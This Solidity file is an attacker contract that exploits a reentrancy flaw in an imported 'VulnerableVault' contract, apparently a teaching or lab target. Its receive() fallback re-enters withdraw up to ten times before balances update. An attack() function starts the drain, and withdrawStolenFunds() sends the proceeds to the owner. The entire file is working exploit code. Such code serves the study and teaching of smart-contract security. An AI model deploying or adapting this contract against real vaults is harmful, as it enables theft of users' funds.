// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableVault.sol";

// This contract exploits the reentrancy vulnerability
contract Attacker {
    VulnerableVault public vault;
    address public owner;
    uint256 public attackCount;
    
    event AttackExecuted(uint256 amount, uint256 count);
    
    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
        owner = msg.sender;
    }
    
    // Fallback function - called when contract receives ETH
    // This is where the reentrancy happens
    receive() external payable {
        if (attackCount < 10) {
            attackCount++;
            // Re-enter the vault before balance is updated
            vault.withdraw(msg.value);
        }
    }
    
    // Start the attack
    function attack(uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        
        // First, deposit some ETH to the vault
        vault.deposit{value: amount}();
        
        attackCount = 0;
        
        // Then withdraw - this triggers reentrancy
        vault.withdraw(amount);
        
        emit AttackExecuted(amount, attackCount);
    }
    
    // Withdraw stolen funds to owner
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // Get attacker contract balance
    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}